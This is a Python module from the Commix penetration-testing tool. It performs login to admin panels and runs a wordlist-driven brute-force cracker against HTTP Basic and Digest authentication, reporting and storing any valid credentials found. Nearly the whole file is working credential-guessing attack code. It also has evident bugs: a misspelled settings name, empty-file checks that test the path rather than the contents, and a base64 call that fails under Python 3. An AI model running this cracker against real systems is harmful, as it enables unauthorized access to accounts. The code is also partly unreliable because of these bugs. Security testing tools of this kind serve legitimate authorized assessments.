#!/usr/bin/env python3
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2019 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import base64
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_cookiejar as _http_cookiejar

"""
If a dashboard or an administration panel is found (auth_url),
do the authentication process using the provided credentials (auth_data).
"""

"""
The authentication process
"""
def authentication_process():
  try:
    auth_url = menu.options.auth_url
    auth_data = menu.options.auth_data
    #cj = cookielib.CookieJar()
    cj = _http_cookiejar.CookieJar()
    opener = _urllib.request.build_opener(_urllib.request.HTTPCookieProcessor(cj))
    request = opener.open(_urllib.request.Request(auth_url))
    cookies = ""
    for cookie in cj:
        cookie_values = cookie.name + "=" + cookie.value + "; "
        cookies += cookie_values
    if len(cookies) != 0 :
      menu.options.cookie = cookies.rstrip()
      if settings.VERBOSITY_LEVEL >= 1:
        success_msg = "The received cookie is "  
        success_msg += str(menu.options.cookie) + Style.RESET_ALL + "."
        print(settings.print_success_msg(success_msg))
    _urllib.request.install_opener(opener)
    request = _urllib.request.Request(auth_url, auth_data)
    # Check if defined extra headers.
    headers.do_check(request)
    #headers.check_http_traffic(request)
    # Get the response of the request.
    response = _urllib.request.urlopen(request)
    return response

  except _urllib.error.HTTPError as err_msg:
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Define the HTTP authentication 
wordlists for usernames / passwords.
"""
def define_wordlists():
  try:
    usernames = []
    if not os.path.isfile(settings.USERNAMES_TXT_FILE):
      err_msg = "The username file (" + str(settings.USERNAMES_TXT_FILE) + ") is not found"
      print(settings.print_critical_msg(err_msg))
      raise SystemExit() 
    if len(settings.USERNAMES_TXT_FILE) == 0:
      err_msg = "The " + str(settings.USERNAMES_TXT_FILE) + " file is empty."
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
    with open(settings.USERNAMES_TXT_FILE, "r") as f: 
      for line in f:
        line = line.strip()
        usernames.append(line)
  except IOError: 
    err_msg = " Check if the " + str(settings.USERNAMES_TXT_FILE) + " file is readable or corrupted."
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  try:
    passwords = []
    if not os.path.isfile(settings.PASSWORDS_TXT_FILE):
      err_msg = "The password file (" + str(settings.PASSWORDS_TXT_FILE) + ") is not found" + Style.RESET_ALL
      print(settings.print_critical_msg(err_msg))
      raise SystemExit() 
    if len(settings.PASSWORDS_TXT_FILE) == 0:
      err_msg = "The " + str(settings.PASSWORDS_TXT_FILE) + " file is empty."
      print(settings.print_critical_msg(err_msg))
      raise SystemExit() 
    with open(settings.PASSWORDS_TXT_FILE, "r") as f: 
      for line in f:
        line = line.strip()
        passwords.append(line)
  except IOError: 
    err_msg = " Check if the " + str(settings.PASSWORDS_TXT_FIL) + " file is readable or corrupted."
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

  return usernames, passwords

"""
Simple Basic / Digest HTTP authentication cracker.
"""
def http_auth_cracker(url, realm):
    # Define the HTTP authentication type.
    authentication_type = menu.options.auth_type
    # Define the authentication wordlists for usernames / passwords.
    usernames, passwords = define_wordlists()
    i = 1 
    found = False
    total = len(usernames) * len(passwords)   
    for username in usernames:
      for password in passwords:
        float_percent = "{0:.1f}%".format(round(((i*100)/(total*1.0)),2))
        # Check if verbose mode on
        if settings.VERBOSITY_LEVEL >= 1:
          payload = "pair of credentials '" + username + ":" + password + "'"
          if settings.VERBOSITY_LEVEL > 1:
            print(settings.print_checking_msg(payload))
          else:
            sys.stdout.write("\r" + settings.print_checking_msg(payload) + "           ")
            sys.stdout.flush()
        try:
          # Basic authentication 
          if authentication_type.lower() == "basic":
            request = _urllib.request.Request(url)
            base64string = base64.encodestring(username + ":" + password)[:-1]
            request.add_header("Authorization", "Basic " + base64string)
            headers.do_check(request)
            headers.check_http_traffic(request)
            result = _urllib.request.urlopen(request)
          # Digest authentication 
          elif authentication_type.lower() == "digest":
            authhandler = _urllib.request.HTTPDigestAuthHandler()
            authhandler.add_password(realm, url, username, password)
            opener = _urllib.request.build_opener(authhandler)
            _urllib.request.install_opener(opener)
            request = _urllib.request.Request(url)
            headers.check_http_traffic(request)
            result = _urllib.request.urlopen(request)

          # Store valid results to session 
          admin_panel = url 
          session_handler.import_valid_credentials(url, authentication_type, admin_panel, username, password)
          found = True
        except KeyboardInterrupt :
          raise 
        except:
          pass  
        if found:
          if not settings.VERBOSITY_LEVEL >= 1:
            float_percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
        else:
          if str(float_percent) == "100.0%":
            if not settings.VERBOSITY_LEVEL >= 1:
              float_percent = Fore.RED + "FAILED" + Style.RESET_ALL
          else:  
            i = i + 1
        if not settings.VERBOSITY_LEVEL >= 1:
          info_msg = "Checking for a valid pair of credentials... [ " +  float_percent + " ]"
          sys.stdout.write("\r\r" + settings.print_info_msg(info_msg))
          sys.stdout.flush()
        if found:
          valid_pair =  "" + username + ":" + password + ""
          print("")
          success_msg = "Identified a valid pair of credentials '" 
          success_msg += valid_pair + Style.RESET_ALL + Style.BRIGHT  + "'."  
          print(settings.print_success_msg(success_msg))
          return valid_pair

    err_msg = "Use the '--auth-cred' option to provide a valid pair of " 
    err_msg += "HTTP authentication credentials (i.e --auth-cred=\"admin:admin\") " 
    err_msg += "or place an other dictionary into '" 
    err_msg += os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/' directory."
    print("\n" + settings.print_critical_msg(err_msg))  
    return False  

# eof